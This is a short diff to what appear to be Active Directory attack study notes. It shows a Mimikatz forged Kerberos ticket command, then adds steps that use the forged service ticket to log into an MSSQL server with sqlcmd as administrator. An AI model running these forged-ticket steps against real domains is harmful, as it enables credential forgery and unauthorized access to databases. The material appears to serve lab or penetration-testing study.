@@ -410,3 +410,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - Ticket will be successfully imported.
   - `klist`
   - It will show that it is a Administrator but only for the service MSSQL.
+  - `sqlcmd -S kerbdc1.kerb.local`
+  - `SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser`
+  - `GO`
+  - We can see that we are an administrator on the SQL Server and we got access to all the SQL databases
